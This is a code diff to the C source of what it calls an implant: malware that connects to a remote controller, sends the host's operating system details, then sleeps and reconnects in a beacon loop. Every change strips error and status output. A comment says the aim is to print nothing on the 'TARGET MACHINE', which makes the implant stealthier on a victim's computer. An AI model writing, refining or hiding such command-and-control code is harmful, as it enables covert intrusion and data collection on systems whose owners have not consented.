@@ -13,7 +13,6 @@ int connect_to_controller()
 
     if (implant_fd < 1)
     {
-        perror("socket"); // fix this, we do not want to print an error on the TARGET MACHINE
         return -1;
     }
 
@@ -46,7 +45,6 @@ int connect_to_controller()
     {
         struct hostent *host = gethostbyname(CONTROLLER_IP_ADDR);
         if (host == NULL || host->h_addr_list == NULL || host->h_addr_list[0] == NULL) {
-            perror("inet_pton/gethostbyname");
             CLOSE_SOCKET(implant_fd);
             return -1;
         }
@@ -55,14 +53,9 @@ int connect_to_controller()
 
     if ((connect(implant_fd, (struct sockaddr *)&controller_ip_structure, sizeof(controller_ip_structure))) < 0)
     {
-        perror("send:");
         CLOSE_SOCKET(implant_fd);
         return -1;
     }
-
-    printf("<Succesfully connected to Controller!\n");
-
-    printf("<Sending initial HELLO......>\n");
 
     char *os_info = operating_system_info();
 
@@ -72,7 +65,6 @@ int connect_to_controller()
     {
 
         // sending the client hello did not work close the implant
-        printf("ERROR!");
         free(os_info);
         CLOSE_SOCKET(implant_fd);
         return -1;
@@ -135,7 +127,6 @@ int main(int argc, char **argv)
             send_packet(&response, implant_fd);
             CLOSE_SOCKET(implant_fd);
             SLEEP(sleep_duration); // sleep for that duration
-            printf("Returned from sleeping for %d seconds \n", sleep_duration);
             implant_fd = connect_to_controller();
 
             if (implant_fd == -1)
